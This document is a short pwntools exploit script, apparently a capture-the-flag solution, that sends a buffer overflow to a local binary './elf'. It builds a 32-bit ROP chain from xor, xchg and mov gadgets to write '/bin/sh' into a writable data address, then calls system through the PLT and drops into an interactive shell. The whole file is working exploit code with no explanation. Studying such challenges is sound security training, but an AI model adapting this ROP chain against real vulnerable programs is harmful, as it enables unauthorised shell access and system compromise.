from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

data_addr=0x0804A028
sys_plt=0x08048430
mov_edx_ecx=0x08048693 
pop_ebx=0x080483e1 
xor_edx_edx=0x08048671
xor_edx_ebx=0x0804867b 
xchg_ecx_edx=0x08048689

#first push addr to ecx
payload="a"*44+p32(xor_edx_edx)+"AAAA"+p32(pop_ebx)+p32(data_addr)
payload+=p32(xor_edx_ebx)+"BBBB"+p32(xchg_ecx_edx)+"CCCC"
#then push data to edx
payload+=p32(xor_edx_edx)+"DDDD"+p32(pop_ebx)+"/bin"+p32(xor_edx_ebx)+"FFFF"
#mov edx dword[ecx]
payload+=p32(mov_edx_ecx)+"EEEE"+p32(0)

#first push addr to ecx
payload+=p32(xor_edx_edx)+"AAAA"+p32(pop_ebx)+p32(data_addr+4)
payload+=p32(xor_edx_ebx)+"BBBB"+p32(xchg_ecx_edx)+"CCCC"
#then push data to edx
payload+=p32(xor_edx_edx)+"DDDD"+p32(pop_ebx)+"/sh\x00"+p32(xor_edx_ebx)+"FFFF"
#mov edx dword[ecx]
payload+=p32(mov_edx_ecx)+"EEEE"+p32(0)

payload+=p32(sys_plt)+p32(0xdeadbeef)+p32(data_addr)

io.sendline(payload)

io.interactive()
